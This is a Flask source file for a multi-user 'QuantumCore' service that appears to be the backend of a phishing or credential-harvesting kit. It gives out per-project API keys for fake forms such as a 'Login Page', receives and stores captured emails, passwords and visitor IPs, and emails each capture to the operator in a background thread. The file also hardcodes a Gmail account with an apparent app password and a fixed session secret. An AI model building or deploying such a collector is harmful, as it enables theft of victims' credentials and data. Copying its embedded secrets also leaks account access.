import os, uuid, datetime, smtplib, threading, json
from flask import Flask, request, jsonify, render_template, session, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from flask_cors import CORS
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = "QUANTUM_CORE_SUPREME_99_VERIFIED"
CORS(app)

# 1. DATABASE SETUP (SQLite for Life-time Local Storage)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///quantum_pro_v8.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# 2. MODELS (Multi-User & Multi-Project System)
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password_hash = db.Column(db.String(128))
    projects = db.relationship('Project', backref='owner', lazy=True)

class Project(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    project_name = db.Column(db.String(100)) # e.g. "Login Page" or "Order Form"
    api_key = db.Column(db.String(100), unique=True, default=lambda: f"QCORE-{uuid.uuid4().hex[:10].upper()}")
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    submission_count = db.Column(db.Integer, default=0)
    max_limit = db.Column(db.Integer, default=50)

class DataVault(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    api_key = db.Column(db.String(100)) 
    payload = db.Column(db.JSON) # Captured Email, Password, Orders etc.
    visitor_ip = db.Column(db.String(50))
    country = db.Column(db.String(100), default="Unknown") # Map feature
    timestamp = db.Column(db.DateTime, default=datetime.datetime.utcnow)

# 3. FAST EMAIL ALERT (Direct to User's Email)
def send_fast_alert(to_email, data, p_name):
    SENDER = "meesamali6829@gmail.com"
    PASSWORD = os.getenv("EMAIL_PASS", "hbrw 2p4m 3c6k lhyc")
    
    subject = f"⚡ NEW DATA: {p_name}"
    body = f"Project Name: {p_name}\n\nData Captured:\n{json.dumps(data, indent=2)}"
    msg = f"Subject: {subject}\n\n{body}"
    
    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(SENDER, PASSWORD)
            server.sendmail(SENDER, to_email, msg)
    except Exception as e:
        print(f"Email Error: {e}")

# 4. AUTHENTICATION (QuantumCore User Control)
@app.route('/signup', methods=['POST'])
def signup():
    data = request.json
    hashed_pw = generate_password_hash(data['password'])
    new_user = User(username=data['username'], email=data['email'], password_hash=hashed_pw)
    db.session.add(new_user)
    db.session.commit()
    return jsonify({"message": "Quantum Account Created"}), 201

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    user = User.query.filter_by(email=data['email']).first()
    if user and check_password_hash(user.password_hash, data['password']):
        session['user_id'] = user.id
        return jsonify({"message": "Logged In", "user": user.username}), 200
    return jsonify({"error": "Invalid Credentials"}), 401

# 5. DATA VAULT DASHBOARD API
@app.route('/api/my-vault-data')
def get_user_data():
    if 'user_id' not in session: return jsonify({"error": "Unauthorized"}), 401
    user = User.query.get(session['user_id'])
    
    all_projects_data = []
    for proj in user.projects:
        submissions = DataVault.query.filter_by(api_key=proj.api_key).order_by(DataVault.timestamp.desc()).all()
        all_projects_data.append({
            "project_name": proj.project_name,
            "api_key": proj.api_key,
            "count": proj.submission_count,
            "vault": [{"id": s.id, "content": s.payload, "ip": s.visitor_ip, "country": s.country, "time": s.timestamp} for s in submissions]
        })
    return jsonify(all_projects_data)

# 6. VISITOR CAPTURE ENGINE (Har Project ka unique data yahan aayega)
@app.route('/v1/receive/<api_key>', methods=['POST'])
def capture(api_key):
    project = Project.query.filter_by(api_key=api_key).first()
    if not project or project.submission_count >= project.max_limit:
        return jsonify({"status": "error", "message": "Invalid Key or Quota Full"}), 403

    visitor_data = request.json
    v_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Store in Data Vault [cite: 2026-02-20]
    new_entry = DataVault(api_key=api_key, payload=visitor_data, visitor_ip=v_ip)
    project.submission_count += 1
    db.session.add(new_entry)
    db.session.commit()
    
    # Fast Email Alert (Background Thread) [cite: 2026-02-20]
    threading.Thread(target=send_fast_alert, args=(project.owner.email, visitor_data, project.project_name)).start()
    
    return jsonify({"status": "success", "msg": "Data Locked in Vault"}), 200

# 7. MAIN PAGES
@app.route('/')
def home():
    return render_template('index.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session: return redirect('/login')
    return render_template('dashboard.html')

if __name__ == '__main__':
    with app.app_context(): db.create_all()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
